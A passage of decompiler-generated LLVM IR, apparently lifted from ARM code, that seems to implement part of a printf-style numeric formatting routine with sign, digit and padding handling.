  %v1_1804c = and i32 %v3_18048, 16
  store i32 %v1_1804c, i32* %lr.global-to-local, align 4
  %v2_1804c = icmp eq i32 %v1_1804c, 0
  %tmp238 = zext i1 %v2_1804c to i32
  %.230 = xor i32 %tmp238, 1
  store i32 %.230, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_18058 = icmp slt i32 %v0_18058, 0
  store i1 %v1_18058, i1* %cpsr_n.global-to-local, align 1
  %v2_18058 = icmp eq i32 %v0_18058, 0
  store i1 %v2_18058, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18058, label %bb218, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_18048
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18074

bb218:                                            ; preds = %dec_label_pc_18048
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_1804c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1804c, label %dec_label_pc_18068, label %dec_label_pc_18074

dec_label_pc_18068:                               ; preds = %bb218
  %v0_18068 = load i32, i32* %r7.global-to-local, align 4
  %v1_18068 = add i32 %v0_18068, -103
  %v3_18068 = sub i32 102, %v0_18068
  %v4_18068 = and i32 %v3_18068, %v0_18068
  %v5_18068 = icmp slt i32 %v4_18068, 0
  store i1 %v5_18068, i1* %cpsr_v.global-to-local, align 1
  %v6_18068 = icmp slt i32 %v1_18068, 0
  store i1 %v6_18068, i1* %cpsr_n.global-to-local, align 1
  %v7_18068 = icmp eq i32 %v0_18068, 103
  store i1 %v7_18068, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18068, label %dec_label_pc_18090, label %bb219

bb219:                                            ; preds = %dec_label_pc_18068
  %v1_1806c = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_1806c = icmp slt i32 %v1_1806c, 0
  store i1 %v2_1806c, i1* %cpsr_n.global-to-local, align 1
  %v3_1806c = icmp eq i32 %v1_1806c, 0
  store i1 %v3_1806c, i1* %cpsr_z.global-to-local, align 1
  %tmp220 = icmp slt i32 %v1_1806c, 1
  br i1 %tmp220, label %dec_label_pc_18090, label %dec_label_pc_18074

dec_label_pc_18074:                               ; preds = %.thread33, %bb218, %bb219
  %v2_18078 = inttoptr i32 %v1_18078 to i32*
  store i32 112, i32* %v2_18078, align 4
  %v1_18080 = load i32, i32* %r6.global-to-local, align 4
  %v2_18080 = add i32 %v1_18080, 4
  %v3_18080 = inttoptr i32 %v2_18080 to i32*
  store i32 1, i32* %v3_18080, align 4
  store i32 ptrtoint (i32* @global_var_1e1b4.1118 to i32), i32* %r3.global-to-local, align 4
  %v1_18088 = load i32, i32* %r6.global-to-local, align 4
  %v2_18088 = add i32 %v1_18088, 8
  %v3_18088 = inttoptr i32 %v2_18088 to i32*
  store i32 ptrtoint (i32* @global_var_1e1b4.1118 to i32), i32* %v3_18088, align 4
  %v0_1808c = load i32, i32* %r6.global-to-local, align 4
  %v1_1808c = add i32 %v0_1808c, 12
  store i32 %v1_1808c, i32* %r6.global-to-local, align 4
  %v0_18090.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_18090

dec_label_pc_18090:                               ; preds = %dec_label_pc_18068, %bb219, %dec_label_pc_18074
  %v1_1809c = phi i32 [ %v1_18078, %bb219 ], [ %v1_1808c, %dec_label_pc_18074 ], [ %v1_18078, %dec_label_pc_18068 ]
  %v0_18090 = phi i32 [ %v0_1809090, %bb219 ], [ %v0_18090.pre, %dec_label_pc_18074 ], [ %v0_1809090, %dec_label_pc_18068 ]
  %v1_18090 = add i32 %v0_18090, 1
  store i32 %v1_18090, i32* %ip.global-to-local, align 4
  %v3_18090 = sub i32 0, %v0_18090
  %v4_18090 = and i32 %v1_18090, %v3_18090
  %v5_18090 = icmp slt i32 %v4_18090, 0
  store i1 %v5_18090, i1* %cpsr_v.global-to-local, align 1
  %v6_18090 = icmp slt i32 %v1_18090, 0
  store i1 %v6_18090, i1* %cpsr_n.global-to-local, align 1
  %v7_18090 = icmp eq i32 %v1_18090, 0
  store i1 %v7_18090, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18090, label %dec_label_pc_180b4, label %dec_label_pc_18098

dec_label_pc_18098:                               ; preds = %dec_label_pc_18090
  %v1_18098 = sub i32 -1, %v0_18090
  %v2_1809c = add i32 %v1_1809c, 4
  %v3_1809c = inttoptr i32 %v2_1809c to i32*
  store i32 %v1_18098, i32* %v3_1809c, align 4
  store i32 ptrtoint (i32* @global_var_1e1a7.1116 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_180a8 = load i32, i32* %r6.global-to-local, align 4
  %v2_180a8 = inttoptr i32 %v1_180a8 to i32*
  store i32 176, i32* %v2_180a8, align 4
  %v0_180ac = load i32, i32* %r3.global-to-local, align 4
  %v1_180ac = load i32, i32* %r6.global-to-local, align 4
  %v2_180ac = add i32 %v1_180ac, 8
  %v3_180ac = inttoptr i32 %v2_180ac to i32*
  store i32 %v0_180ac, i32* %v3_180ac, align 4
  %v0_180b0 = load i32, i32* %r6.global-to-local, align 4
  %v1_180b0 = add i32 %v0_180b0, 12
  store i32 %v1_180b0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_180b4

dec_label_pc_180b4:                               ; preds = %dec_label_pc_18090, %dec_label_pc_18098
  %v2_180bc = phi i32 [ %v1_1809c, %dec_label_pc_18090 ], [ %v1_180b0, %dec_label_pc_18098 ]
  %v0_180b4 = load i32, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_180b4 = icmp slt i32 %v0_180b4, 0
  store i1 %v1_180b4, i1* %cpsr_n.global-to-local, align 1
  %v2_180b4 = icmp eq i32 %v0_180b4, 0
  store i1 %v2_180b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_180b4, label %.thread42, label %bb221

bb221:                                            ; preds = %dec_label_pc_180b4
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_180bc = inttoptr i32 %v2_180bc to i32*
  store i32 112, i32* %v3_180bc, align 4
  %v1_180c0 = load i32, i32* %r4.global-to-local, align 4
  %v2_180c0 = load i32, i32* %r6.global-to-local, align 4
  %v3_180c0 = add i32 %v2_180c0, 8
  %v4_180c0 = inttoptr i32 %v3_180c0 to i32*
  store i32 %v1_180c0, i32* %v4_180c0, align 4
  %v1_180c4 = load i32, i32* %r1.global-to-local, align 4
  %v2_180c4 = load i32, i32* %r6.global-to-local, align 4
  %v3_180c4 = add i32 %v2_180c4, 4
  %v4_180c4 = inttoptr i32 %v3_180c4 to i32*
  store i32 %v1_180c4, i32* %v4_180c4, align 4
  %v1_180c8 = load i32, i32* %r6.global-to-local, align 4
  %v2_180c8 = add i32 %v1_180c8, 12
  store i32 %v2_180c8, i32* %r6.global-to-local, align 4
  br label %.thread42

.thread42:                                        ; preds = %dec_label_pc_180b4, %bb221
  %v1_180ec = phi i32 [ %v2_180bc, %dec_label_pc_180b4 ], [ %v2_180c8, %bb221 ]
  %v0_180cc = load i32, i32* %r7.global-to-local, align 4
  %v1_180cc = add i32 %v0_180cc, -103
  %v3_180cc = sub i32 102, %v0_180cc
  %v4_180cc = and i32 %v3_180cc, %v0_180cc
  %v5_180cc = icmp slt i32 %v4_180cc, 0
  store i1 %v5_180cc, i1* %cpsr_v.global-to-local, align 1
  %v6_180cc = icmp slt i32 %v1_180cc, 0
  store i1 %v6_180cc, i1* %cpsr_n.global-to-local, align 1
  %v7_180cc = icmp eq i32 %v0_180cc, 103
  store i1 %v7_180cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_180cc, label %dec_label_pc_180d4, label %dec_label_pc_180dc

dec_label_pc_180d4:                               ; preds = %.thread42
  %v0_180d4 = load i32, i32* %lr.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_180d4 = icmp slt i32 %v0_180d4, 0
  store i1 %v1_180d4, i1* %cpsr_n.global-to-local, align 1
  %v2_180d4 = icmp eq i32 %v0_180d4, 0
  store i1 %v2_180d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_180d4, label %dec_label_pc_18104, label %dec_label_pc_180dc

dec_label_pc_180dc:                               ; preds = %.thread42, %dec_label_pc_180d4
  %v0_180dc = load i32, i32* %ip.global-to-local, align 4
  %v1_180dc = load i32, i32* %r1.global-to-local, align 4
  %v2_180dc = sub i32 %v1_180dc, %v0_180dc
  store i32 %v2_180dc, i32* %r3.global-to-local, align 4
  %v1_180e0 = load i32, i32* %r8.global-to-local, align 4
  %v2_180e0 = sub i32 %v2_180dc, %v1_180e0
  %v4_180e0 = xor i32 %v1_180e0, %v2_180dc
  %v5_180e0 = xor i32 %v2_180e0, %v2_180dc
  %v6_180e0 = and i32 %v5_180e0, %v4_180e0
  %v7_180e0 = icmp slt i32 %v6_180e0, 0
  store i1 %v7_180e0, i1* %cpsr_v.global-to-local, align 1
  %v8_180e0 = icmp slt i32 %v2_180e0, 0
  store i1 %v8_180e0, i1* %cpsr_n.global-to-local, align 1
  %v9_180e0 = icmp eq i32 %v2_180dc, %v1_180e0
  store i1 %v9_180e0, i1* %cpsr_z.global-to-local, align 1
  %v2_180e4 = xor i1 %v8_180e0, %v7_180e0
  br i1 %v2_180e4, label %dec_label_pc_180e8, label %dec_label_pc_18104

dec_label_pc_180e8:                               ; preds = %dec_label_pc_180dc
  %v2_180e8 = sub i32 %v1_180e0, %v2_180dc
  %v2_180ec = add i32 %v1_180ec, 4
  %v3_180ec = inttoptr i32 %v2_180ec to i32*
  store i32 %v2_180e8, i32* %v3_180ec, align 4
  store i32 ptrtoint (i32* @global_var_1e1a7.1116 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_180f8 = load i32, i32* %r6.global-to-local, align 4
  %v2_180f8 = inttoptr i32 %v1_180f8 to i32*
  store i32 176, i32* %v2_180f8, align 4
  %v0_180fc = load i32, i32* %r3.global-to-local, align 4
  %v1_180fc = load i32, i32* %r6.global-to-local, align 4
  %v2_180fc = add i32 %v1_180fc, 8
  %v3_180fc = inttoptr i32 %v2_180fc to i32*
  store i32 %v0_180fc, i32* %v3_180fc, align 4
  %v0_18100 = load i32, i32* %r6.global-to-local, align 4
  %v1_18100 = add i32 %v0_18100, 12
  store i32 %v1_18100, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18104

dec_label_pc_18104:                               ; preds = %dec_label_pc_180dc, %dec_label_pc_180d4, %dec_label_pc_180e8
  %v1_18198.pre.pre = phi i32 [ %v1_180ec, %dec_label_pc_180dc ], [ %v1_180ec, %dec_label_pc_180d4 ], [ %v1_18100, %dec_label_pc_180e8 ]
  %v0_18104 = load i32, i32* %sl.global-to-local, align 4
  %v1_18104 = add i32 %v0_18104, -102
  %v3_18104 = sub i32 101, %v0_18104
  %v4_18104 = and i32 %v3_18104, %v0_18104
  %v5_18104 = icmp slt i32 %v4_18104, 0
  store i1 %v5_18104, i1* %cpsr_v.global-to-local, align 1
  %v6_18104 = icmp slt i32 %v1_18104, 0
  store i1 %v6_18104, i1* %cpsr_n.global-to-local, align 1
  %v7_18104 = icmp eq i32 %v0_18104, 102
  store i1 %v7_18104, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18104, label %dec_label_pc_1818c, label %dec_label_pc_1810c

dec_label_pc_1810c:                               ; preds = %dec_label_pc_18104
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18110 = load i32, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_18110 = icmp slt i32 %v0_18110, 0
  store i1 %v1_18110, i1* %cpsr_n.global-to-local, align 1
  %v2_18110 = icmp eq i32 %v0_18110, 0
  store i1 %v2_18110, i1* %cpsr_z.global-to-local, align 1
  %v4_18114 = zext i8 %stack_var_-66.0108114 to i32
  store i32 %v4_18114, i32* %r8.global-to-local, align 4
  store i32 0, i32* %stack_var_-51, align 4
  %v4_18124 = sub i32 0, %v0_18110
  %storemerge140 = select i1 %v1_18110, i32 %v4_18124, i32 %v0_18110
  %tmp239 = ashr i32 %v0_18110, 31
  %tmp240 = and i32 %tmp239, 2
  %tmp241 = add nuw nsw i32 %tmp240, 43
  store i32 %storemerge140, i32* %r4.global-to-local, align 4
  store i32 %tmp241, i32* %sl.global-to-local, align 4
  %v2_1812c = ptrtoint i32* %stack_var_-51 to i32
  store i32 %v2_1812c, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_18134

dec_label_pc_18134:                               ; preds = %dec_label_pc_18164, %dec_label_pc_18134, %dec_label_pc_1810c
  %v2_1814c = phi i32 [ %v2_1812c, %dec_label_pc_1810c ], [ %v6_1814c, %dec_label_pc_18134 ], [ %v6_1814c, %dec_label_pc_18164 ]
  %v0_18148 = phi i32 [ %storemerge140, %dec_label_pc_1810c ], [ %v2_18150, %dec_label_pc_18134 ], [ %v2_18150, %dec_label_pc_18164 ]
  %v2_1813c = srem i32 %v0_18148, 10
  %v1_18140 = add nsw i32 %v2_1813c, 48
  store i32 %v1_18140, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v0_18148, i32* %r0.global-to-local, align 4
  %v1_1814c = trunc i32 %v1_18140 to i8
  %v3_1814c = add i32 %v2_1814c, -1
  %v4_1814c = inttoptr i32 %v3_1814c to i8*
  store i8 %v1_1814c, i8* %v4_1814c, align 1
  %v5_1814c = load i32, i32* %r5.global-to-local, align 4
  %v6_1814c = add i32 %v5_1814c, -1
  store i32 %v6_1814c, i32* %r5.global-to-local, align 4
  %v0_18150 = load i32, i32* %r0.global-to-local, align 4
  %v1_18150 = load i32, i32* %r1.global-to-local, align 4
  %v2_18150 = sdiv i32 %v0_18150, %v1_18150
  store i32 %v2_18150, i32* %r0.global-to-local, align 4
  %v0_18154 = load i32, i32* %r7.global-to-local, align 4
  %v1_18154 = add i32 %v0_18154, 1
  store i32 %v1_18154, i32* %r7.global-to-local, align 4
  %v1_18158 = add i32 %v0_18154, -2
  %v3_18158 = sub i32 1, %v0_18154
  %v4_18158 = and i32 %v3_18158, %v1_18154
  %v5_18158 = icmp slt i32 %v4_18158, 0
  store i1 %v5_18158, i1* %cpsr_v.global-to-local, align 1
  %v6_18158 = icmp slt i32 %v1_18158, 0
  store i1 %v6_18158, i1* %cpsr_n.global-to-local, align 1
  %v7_18158 = icmp eq i32 %v1_18154, 3
  store i1 %v7_18158, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_18150, i32* %r4.global-to-local, align 4
  %v7_18160 = icmp slt i32 %v1_18154, 4
  br i1 %v7_18160, label %dec_label_pc_18134, label %dec_label_pc_18164

dec_label_pc_18164:                               ; preds = %dec_label_pc_18134
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_18164 = icmp slt i32 %v2_18150, 0
  store i1 %v1_18164, i1* %cpsr_n.global-to-local, align 1
  %v2_18164 = icmp eq i32 %v2_18150, 0
  store i1 %v2_18164, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18164, label %dec_label_pc_1816c, label %dec_label_pc_18134

dec_label_pc_1816c:                               ; preds = %dec_label_pc_18164
  %v1_1816c = add i32 %v5_1814c, -2
  store i32 %v1_1816c, i32* %r3.global-to-local, align 4
  %v0_18170 = load i32, i32* %sl.global-to-local, align 4
  %v1_18170 = trunc i32 %v0_18170 to i8
  %v4_18170 = inttoptr i32 %v1_1816c to i8*
  store i8 %v1_18170, i8* %v4_18170, align 1
  %v0_18174 = load i32, i32* %r3.global-to-local, align 4
  %v1_18174 = add i32 %v0_18174, -1
  store i32 %v1_18174, i32* %r2.global-to-local, align 4
  %v0_18178 = load i32, i32* %r8.global-to-local, align 4
  %v1_18178 = trunc i32 %v0_18178 to i8
  %v4_18178 = inttoptr i32 %v1_18174 to i8*
  store i8 %v1_18178, i8* %v4_18178, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_18180 = load i32, i32* %r6.global-to-local, align 4
  %v1_18180 = inttoptr i32 %v0_18180 to i32*
  store i32 112, i32* %v1_18180, align 4
  %v3_18180 = add i32 %v0_18180, 4
  %v4_18180 = inttoptr i32 %v3_18180 to i32*
  %v5_18180 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_18180, i32* %v4_18180, align 4
  %v0_18184 = load i32, i32* %r2.global-to-local, align 4
  %v1_18184 = load i32, i32* %r6.global-to-local, align 4
  %v2_18184 = add i32 %v1_18184, 8
  %v3_18184 = inttoptr i32 %v2_18184 to i32*
  store i32 %v0_18184, i32* %v3_18184, align 4
  %v0_18188 = load i32, i32* %r6.global-to-local, align 4
  %v1_18188 = add i32 %v0_18188, 12
  store i32 %v1_18188, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1818c

dec_label_pc_1818c:                               ; preds = %dec_label_pc_18104, %.thread105, %dec_label_pc_1816c
  %v1_18198.pre = phi i32 [ %v2_17d04, %.thread105 ], [ %v1_18188, %dec_label_pc_1816c ], [ %v1_18198.pre.pre, %dec_label_pc_18104 ]
  %v2_1818c = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_1818c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18190

dec_label_pc_18190:                               ; preds = %dec_label_pc_18190, %dec_label_pc_1818c
  %v0_18190 = phi i32 [ %v2_1818c, %dec_label_pc_1818c ], [ %v4_18190, %dec_label_pc_18190 ]
  %stack_var_-188.0 = phi i32 [ %v3_17c3c, %dec_label_pc_1818c ], [ %v2_1819c, %dec_label_pc_18190 ]
  %v1_18190 = inttoptr i32 %v0_18190 to i32*
  %v2_18190 = load i32, i32* %v1_18190, align 4
  store i32 %v2_18190, i32* %r3.global-to-local, align 4
  %v4_18190 = add i32 %v0_18190, 12
  store i32 %v4_18190, i32* %r2.global-to-local, align 4
  %v3_18198 = icmp ult i32 %v4_18190, %v1_18198.pre
  %v2_1819c = sub i32 %stack_var_-188.0, %v2_18190
  store i32 %v2_1819c, i32* %ip.global-to-local, align 4
  br i1 %v3_18198, label %dec_label_pc_18190, label %dec_label_pc_181a8

dec_label_pc_181a8:                               ; preds = %dec_label_pc_18190
  %v3_181a8 = load i8, i8* %stack_var_-50, align 1
  %v4_181a8 = sext i8 %v3_181a8 to i32
  store i32 %v4_181a8, i32* %r3.global-to-local, align 4
  store i32 %v4_181a8, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_181ac = icmp slt i8 %v3_181a8, 0
  store i1 %v1_181ac, i1* %cpsr_n.global-to-local, align 1
  %v2_181ac = icmp eq i8 %v3_181a8, 0
  store i1 %v2_181ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_181ac, label %bb226, label %bb225

bb225:                                            ; preds = %dec_label_pc_181a8
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %dec_label_pc_181a8, %bb225
  %v1_181f8 = phi i32 [ %v4_181a8, %dec_label_pc_181a8 ], [ 1, %bb225 ]
  %v2_181b4 = sub i32 %v2_1819c, %v1_181f8
  store i32 %v2_181b4, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_181bc = ptrtoint i8* %stack_var_-50 to i32
  store i32 %v2_181bc, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_181c0 = icmp slt i32 %v2_181b4, 0
  store i1 %v1_181c0, i1* %cpsr_n.global-to-local, align 1
  %v2_181c0 = icmp eq i32 %v2_181b4, 0
  store i1 %v2_181c0, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-184, align 4
  %tmp227 = icmp slt i32 %v2_181b4, 1
  br i1 %tmp227, label %dec_label_pc_18220, label %dec_label_pc_181d4

dec_label_pc_181d4:                               ; preds = %bb226
  %v0_181d4 = load i32, i32* %fp.global-to-local, align 4
  %v1_181d4 = add i32 %v0_181d4, 12
  %v2_181d4 = inttoptr i32 %v1_181d4 to i32*
  %v3_181d4 = load i32, i32* %v2_181d4, align 4
  store i32 %v3_181d4, i32* %r3.global-to-local, align 4
  %v1_181d8 = and i32 %v3_181d4, 8
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_181d8 = icmp eq i32 %v1_181d8, 0
  store i1 %v2_181d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_181d8, label %dec_label_pc_181f0, label %dec_label_pc_181e0

dec_label_pc_181e0:                               ; preds = %dec_label_pc_181d4
  store i32 ptrtoint (i32* @global_var_1e1a7.1116 to i32), i32* %r3.global-to-local, align 4
  %v1_181e4 = add i32 %v1_18198.pre, 12
  store i32 %v1_181e4, i32* %r5.global-to-local, align 4
  %v1_181e8 = inttoptr i32 %v1_18198.pre to i32*
  store i32 160, i32* %v1_181e8, align 4
  %v3_181e8 = add i32 %v1_18198.pre, 4
  %v4_181e8 = inttoptr i32 %v3_181e8 to i32*
  %v5_181e8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_181e8, i32* %v4_181e8, align 4
  %v6_181e8 = add i32 %v1_18198.pre, 8
  %v7_181e8 = inttoptr i32 %v6_181e8 to i32*
  %v8_181e8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_181e8, i32* %v7_181e8, align 4
  br label %dec_label_pc_18224

dec_label_pc_181f0:                               ; preds = %dec_label_pc_181d4
  %v1_181f0 = add i32 %v0_181d4, 16
  %v2_181f0 = inttoptr i32 %v1_181f0 to i32*
  %v3_181f0 = load i32, i32* %v2_181f0, align 4
  store i32 %v3_181f0, i32* %r3.global-to-local, align 4
  %v1_181f4 = add i32 %v3_181f0, -48
  %v3_181f4 = sub i32 47, %v3_181f0
  %v4_181f4 = and i32 %v3_181f4, %v3_181f0
  %v5_181f4 = icmp slt i32 %v4_181f4, 0
  store i1 %v5_181f4, i1* %cpsr_v.global-to-local, align 1
  %v6_181f4 = icmp slt i32 %v1_181f4, 0
  store i1 %v6_181f4, i1* %cpsr_n.global-to-local, align 1
  %v7_181f4 = icmp eq i32 %v3_181f0, 48
  store i1 %v7_181f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_181f4, label %dec_label_pc_18204, label %bb228

bb228:                                            ; preds = %dec_label_pc_181f0
  store i32 %v2_1819c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18220

dec_label_pc_18204:                               ; preds = %dec_label_pc_181f0
  %v3_18204 = load i32, i32* %stack_var_-168, align 4
  store i32 %v1_18198.pre, i32* %r5.global-to-local, align 4
  %v2_1820c = add i32 %v3_18204, %v2_181b4
  store i32 %v2_1820c, i32* %r3.global-to-local, align 4
  store i32 %v2_1820c, i32* %stack_var_-168, align 4
  br label %dec_label_pc_18224

dec_label_pc_18218:                               ; preds = %dec_label_pc_1822c
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1825c

dec_label_pc_18220:                               ; preds = %bb228, %bb226
  store i32 %v1_18198.pre, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18224

dec_label_pc_18224:                               ; preds = %dec_label_pc_18204, %dec_label_pc_181e0, %dec_label_pc_18220
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_17c18, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1822c

dec_label_pc_1822c:                               ; preds = %dec_label_pc_18254, %dec_label_pc_18224
  %v0_1822c = phi i32 [ %v1_1824c, %dec_label_pc_18254 ], [ %v2_17c18, %dec_label_pc_18224 ]
  %v1_1822c = inttoptr i32 %v0_1822c to i32*
  %v2_1822c = load i32, i32* %v1_1822c, align 4
  store i32 %v2_1822c, i32* %r1.global-to-local, align 4
  %v3_1822c = add i32 %v0_1822c, 4
  %v4_1822c = inttoptr i32 %v3_1822c to i32*
  %v5_1822c = load i32, i32* %v4_1822c, align 4
  store i32 %v5_1822c, i32* %r2.global-to-local, align 4
  %v6_1822c = add i32 %v0_1822c, 8
  %v7_1822c = inttoptr i32 %v6_1822c to i32*
  %v8_1822c = load i32, i32* %v7_1822c, align 4
  store i32 %v8_1822c, i32* %r3.global-to-local, align 4
  %v2_18230 = load i32, i32* %stack_var_-192, align 4
  store i32 %v2_18230, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* %ip.global-to-local, align 4
  store i32 98880, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_18240 = load i32, i32* %r4.global-to-local, align 4
  %v1_18240 = add i32 %v0_18240, 4
  %v2_18240 = inttoptr i32 %v1_18240 to i32*
  %v3_18240 = load i32, i32* %v2_18240, align 4
  store i32 %v3_18240, i32* %r3.global-to-local, align 4
  %v0_18244 = load i32, i32* %r0.global-to-local, align 4
  %v2_18244 = sub i32 %v0_18244, %v3_18240
  %v4_18244 = xor i32 %v0_18244, %v3_18240
  %v5_18244 = xor i32 %v2_18244, %v0_18244
  %v6_18244 = and i32 %v5_18244, %v4_18244
  %v7_18244 = icmp slt i32 %v6_18244, 0
  store i1 %v7_18244, i1* %cpsr_v.global-to-local, align 1
  %v8_18244 = icmp slt i32 %v2_18244, 0
  store i1 %v8_18244, i1* %cpsr_n.global-to-local, align 1
  %v9_18244 = icmp eq i32 %v0_18244, %v3_18240
  store i1 %v9_18244, i1* %cpsr_z.global-to-local, align 1
  %v0_18248 = load i32, i32* %r6.global-to-local, align 4
  %v2_18248 = add i32 %v0_18248, %v0_18244
  store i32 %v2_18248, i32* %r6.global-to-local, align 4
  %v1_1824c = add i32 %v0_18240, 12
  store i32 %v1_1824c, i32* %r4.global-to-local, align 4
  br i1 %v9_18244, label %dec_label_pc_18254, label %dec_label_pc_18218

dec_label_pc_18254:                               ; preds = %dec_label_pc_1822c
  %v1_18254 = load i32, i32* %r5.global-to-local, align 4
  %v2_18254 = sub i32 %v1_1824c, %v1_18254
  %v3_18254 = icmp ult i32 %v1_1824c, %v1_18254
  %v4_18254 = xor i32 %v1_18254, %v1_1824c
  %v5_18254 = xor i32 %v2_18254, %v1_1824c
  %v6_18254 = and i32 %v5_18254, %v4_18254
  %v7_18254 = icmp slt i32 %v6_18254, 0
  store i1 %v7_18254, i1* %cpsr_v.global-to-local, align 1
  %v8_18254 = icmp slt i32 %v2_18254, 0
  store i1 %v8_18254, i1* %cpsr_n.global-to-local, align 1
  %v9_18254 = icmp eq i32 %v1_1824c, %v1_18254
  store i1 %v9_18254, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18254, label %dec_label_pc_1822c, label %dec_label_pc_1825c

dec_label_pc_1825c:                               ; preds = %dec_label_pc_18254, %dec_label_pc_18218
  %v0_1825c = phi i32 [ -1, %dec_label_pc_18218 ], [ %v2_18248, %dec_label_pc_18254 ]
  store i32 %v0_1825c, i32* %r0.global-to-local, align 4
  %v8_18268 = load i32, i32* %stack_var_-36, align 4
  store i32 %v8_18268, i32* @r6, align 4
  store i32 %v6_17c04, i32* @r7, align 4
  store i32 %v9_17c04, i32* @r8, align 4
  store i32 %v12_17c04, i32* @sb, align 4
  store i32 %v15_17c04, i32* @sl, align 4
  store i32 %v18_17c04, i32* @fp, align 4
  ret i32 %v0_1825c

; uselistorder directives
  uselistorder i32 %v0_1825c, { 1, 0 }
  uselistorder i32 %v2_18254, { 1, 0 }
  uselistorder i32 %v1_18254, { 2, 0, 1, 3 }
  uselistorder i32 %v1_1824c, { 4, 0, 1, 5, 3, 6, 2 }
  uselistorder i32 %v2_18244, { 1, 0 }
  uselistorder i32 %v0_18244, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v3_18240, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1822c, { 2, 1, 0 }
  uselistorder i32 %v3_181f0, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_1819c, { 0, 1, 3, 2 }
  uselistorder i32 %v4_18190, { 1, 2, 0 }
  uselistorder i32 %v0_18190, { 1, 0 }
  uselistorder i32 %v1_18198.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_18150, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v6_1814c, { 2, 1, 0 }
  uselistorder i32 %storemerge140, { 1, 0 }
  uselistorder i32 %v0_18110, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_18104, { 3, 0, 1, 2 }
  uselistorder i32 %v2_180e0, { 1, 0 }
  uselistorder i32 %v1_180e0, { 1, 2, 0, 3 }
  uselistorder i32 %v2_180dc, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v0_180d4, { 1, 0 }
  uselistorder i32 %v0_180cc, { 3, 0, 1, 2 }
  uselistorder i32 %v0_180b4, { 1, 0 }
  uselistorder i32 %v1_18090, { 1, 2, 0, 3 }
  uselistorder i32 %v0_18090, { 1, 0, 2 }
  uselistorder i32 %v1_1806c, { 0, 2, 1 }
  uselistorder i32 %v0_18068, { 3, 0, 1, 2 }
  uselistorder i1 %v2_1804c, { 2, 1, 0 }
  uselistorder i32 %v2_17fa4, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_17f94, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder i32 %v0_18038, { 3, 0, 4, 7, 5, 6, 9, 1, 2, 8 }
  uselistorder i32 %v0_17f40, { 1, 4, 0, 2, 3 }
  uselistorder i1 %v2_17f28, { 1, 0 }
  uselistorder i32 %v2_17f20, { 1, 2, 0 }
  uselistorder i32 %v1_17f14, { 1, 0 }
  uselistorder i32 %v0_17f14, { 2, 3, 5, 0, 4, 1 }
